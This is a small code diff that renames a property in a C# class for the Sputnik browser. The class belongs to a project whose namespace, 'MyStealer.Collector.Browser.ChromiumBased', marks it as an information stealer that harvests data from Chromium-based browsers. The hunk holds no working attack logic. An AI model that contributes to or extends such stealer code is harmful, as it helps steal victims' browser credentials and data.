@@ -5,7 +5,7 @@ namespace MyStealer.Collector.Browser.ChromiumBased
 {
     public class Sputnik : Chromium
     {
-        public override string ModuleName => "Sputnik";
+        public override string Name => "Sputnik";
 
         public override bool HasProfiles => false;
 
